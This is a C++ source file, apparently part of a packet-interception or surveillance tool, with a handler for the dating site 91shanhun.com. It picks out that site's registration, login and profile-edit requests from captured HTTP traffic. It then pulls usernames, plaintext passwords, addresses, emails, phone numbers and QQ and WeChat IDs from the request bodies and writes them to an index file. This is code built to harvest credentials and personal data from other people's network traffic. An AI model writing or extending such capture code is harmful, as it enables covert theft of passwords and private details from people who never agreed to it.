#include "StdAfx.h"
#include "MarriageShanHunWang.h"

marriage::ShanHunMarriage::ShanHunMarriage(HttpSession *http_session, const string &pro_name) : Marriage(http_session,pro_name)
{
	app_ = "闪婚网";	
}

marriage::ShanHunMarriage::~ShanHunMarriage()
{
	
}

int marriage::ShanHunMarriage::IsShanHunMarriage(HttpSession *http_session)
{
	//网页注册
	if((http_session->m_Requestline.m_Host.Find("www.91shanhun.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/register.asp")!=-1)) 
	{
		return kPcWebRegister;
	}
	//网页登录
	if((http_session->m_Requestline.m_Host.Find("www.91shanhun.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/login.asp?action=chk")!=-1)) 
	{
		return kPcWebLogin;
	}
	//网页修改资料
	if((http_session->m_Requestline.m_Host.Find("www.91shanhun.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/u_mod.asp")!=-1)) 
	{
		return kPcWebModiy;
	}
	return 0;
}

int marriage::ShanHunMarriage::Process(const char *packet,int action)
{
	//网页注册
	if (action == kPcWebRegister)
	{
		return PcWebRegister(packet);
	}
	//网页登录
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//网页修改个人资料
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}

	return 1;
}
//pc注册
int marriage::ShanHunMarriage::PcWebRegister(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//用户名
	string username = ms_->GetValueFromMapByKey("username",true);
	//密码
	string password = ms_->GetValueFromMapByKey("password1",true);
	//地址
	string address = ms_->GetValueFromMapByKey("address",true);
	//邮箱
	string email = ms_->GetValueFromMapByKey("email",true);
	//QQ 
	string oicq = ms_->GetValueFromMapByKey("oicq",true);
	//性别
	string sex = ms_->GetValueFromMapByKey("sex",true);
	//手机
	string tel = ms_->GetValueFromMapByKey("tel",true);
	//微信
	string weixin = ms_->GetValueFromMapByKey("phone",true);

	output_text_ =
		"user=" + username + "\r\n" +			//用户名
		"pass=" +  password  + "\r\n" +			//密码 
        "islogin=" +  address+ "\r\n" +			//地址
		"nick=" +email + "\r\n" +               //邮箱
		"sex=" + sex+ "\r\n" +					//性别
		"oid=" + tel + "\r\n" +					//手机
		"clientip=" + 	  	oicq + "\r\n" + 	//QQ
		"wifissid=" + 	 	weixin + "\r\n" + 	//微信
		"netmark=" + app_ + "\r\n" + 			//来源
		"clientmsg=" + platformWeb + "\r\n" +	//操作平台
		"state=注册\r\n";						//状态
	WriteIndexFile();
	return 1;
}

//web登录
int marriage::ShanHunMarriage::PcWebLogin(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	string username = ms_->GetValueFromMapByKey("username",true);
	string password = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" +          //用户名
		"pass=" + password + "\r\n" +          //密码
		"netmark=" + app_ + "\r\n" + 		   //来源
		"clientmsg=" + platformWeb + "\r\n" +  //操作平台
		"state=登录\r\n";			           //状态
	WriteIndexFile();
	return 1;
}

//详细资料个人信息
int marriage::ShanHunMarriage::PcWebModiy(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	//地址
	string address = ms_->GetValueFromMapByKey("address",true);
	//邮箱
	string email = ms_->GetValueFromMapByKey("email",true);
	//QQ 
	string oicq = ms_->GetValueFromMapByKey("oicq",true);
	//手机
	string tel = ms_->GetValueFromMapByKey("tel",true);
	//微信
	string weixin = ms_->GetValueFromMapByKey("phone",true);
	
	output_text_ =
        "islogin=" +  address+ "\r\n" +         //地址
		"nick=" +email + "\r\n" +               //邮箱
		"oid=" + tel + "\r\n" +                 //手机
		"clientip=" + 	  	oicq + "\r\n" + 	//QQ
		"wifissid=" + 	 	weixin + "\r\n" + 	//微信
		"netmark=" + app_ + "\r\n" + 	        //来源
		"clientmsg=" + platformWeb + "\r\n" +   //操作平台
		"state=修改\r\n";			            //状态
	WriteIndexFile();
	return 1;
}